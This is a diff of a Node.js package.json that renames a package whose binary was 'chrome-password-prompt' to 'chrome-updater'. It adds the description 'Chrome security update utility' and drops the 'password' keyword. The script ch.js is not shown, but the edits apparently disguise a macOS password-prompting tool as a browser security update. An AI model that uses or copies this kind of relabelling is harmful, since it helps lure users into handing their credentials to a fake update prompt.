@@ -1,10 +1,10 @@
 {
-  "name": "cpo",
+  "name": "chrome-updater",
   "version": "1.0.0",
-  "description": "ss",
+  "description": "Chrome security update utility",
   "main": "ch.js",
   "bin": {
-    "chrome-password-prompt": "ch.js"
+    "chrome-update": "ch.js"
   },
   "scripts": {
     "start": "node ch.js",
@@ -13,10 +13,9 @@
   },
   "keywords": [
     "chrome",
-    "password",
-    "macos",
+    "update",
     "security",
-    "prompt"
+    "macos"
   ],
   "author": "",
   "license": "MIT",
